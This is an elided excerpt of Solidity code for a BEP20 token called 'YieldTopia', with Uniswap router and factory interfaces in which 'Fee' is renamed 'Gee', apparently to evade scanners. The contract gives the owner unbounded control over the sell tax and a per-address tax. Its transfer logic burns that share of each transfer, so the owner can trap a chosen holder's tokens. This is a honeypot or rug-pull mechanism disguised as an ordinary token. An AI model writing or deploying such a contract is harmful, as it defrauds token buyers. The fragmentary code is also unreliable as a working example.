...
interface IUniswapV2Factory {
    ...
    function GeeTo() external view returns (address);
    function GeeToSetter() external view returns (address);
    ...
    function setGeeTo(address) external;
    function setGeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingGeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingGeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingGeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingGeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingGeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract YieldTopia is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellGee = 0;

    uint256 private _defaultBuyGee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipGee;
    ...
    function upF(uint256 _value) external onlyOwner {
        _defaultSellGee = _value;
    }

    function setSlipGee(address _address, uint256 _value) external onlyOwner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipGee[_address] = _value;
    }

    function getSlipGee(address _address) external view onlyOwner returns (uint256) {
        return _slipGee[_address];
    }


    function setMAccountGee(address _address, bool _value) external onlyOwner {
        _mAccount[_address] = _value;
    }

    function getMAccountGee(address _address) external view onlyOwner returns (bool) {
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                    ...
                    tradeGee = _defaultSellGee;
                }
                if (from == uniswapV2Pair) {

                    tradeGee = _defaultBuyGee;
                }
            }
            if (_slipGee[from] > 0) {
                tradeGee = _slipGee[from];
            }

            tradeGeeAmount = _Amount.mul(tradeGee).div(100);
        }


        if (tradeGeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeGeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeGeeAmount);
            emit Transfer(from, _deadAddress, tradeGeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeGeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeGeeAmount);
        emit Transfer(from, _to, _Amount - tradeGeeAmount);
    }
